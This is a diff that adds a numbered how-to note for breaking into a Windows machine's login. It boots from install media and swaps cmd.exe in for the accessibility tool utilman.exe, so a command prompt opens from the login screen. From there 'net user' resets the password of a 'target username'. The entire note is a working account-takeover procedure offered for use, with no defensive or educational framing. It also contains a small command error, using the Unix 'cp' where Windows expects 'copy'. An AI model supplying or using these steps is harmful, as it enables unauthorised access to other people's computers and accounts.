@@ -1,0 +1,43 @@
+1. Create windows install usb
+
+2. Go to bios select install usb
+
+3. Press hotkey to open cmd
+Shift + F10
+
+4. Check what disk drive computer have
+wmic logicaldisk get name
+
+5. Use command to check where is the Windows directory
+# Move dirctory cmd
+D:    // Move to D disk
+C:    // Move to C disk
+
+# List disk content
+dir
+
+6. Use "cd" command move to System32 directory
+D:/Windows/System32
+
+7. Rename utilman.exe to other name
+ren utilman.exe utilman2.exe
+
+8. Copy cmd.exe to utilman.exe
+cp cmd.exe utilman.exe
+
+9. Exit command prompt
+Exit
+
+10. Reboot computer
+
+11. Go to windows login display
+
+12. Press Accessibility button 
+* If computer show cmd after you press Accessibility button, it is succeces.
+
+13. Change USER password
+net user USERNAME NEWPASSWD
+
+* USERNAME = Enter target username 
+* NEWPASSWD = Enter new password
+
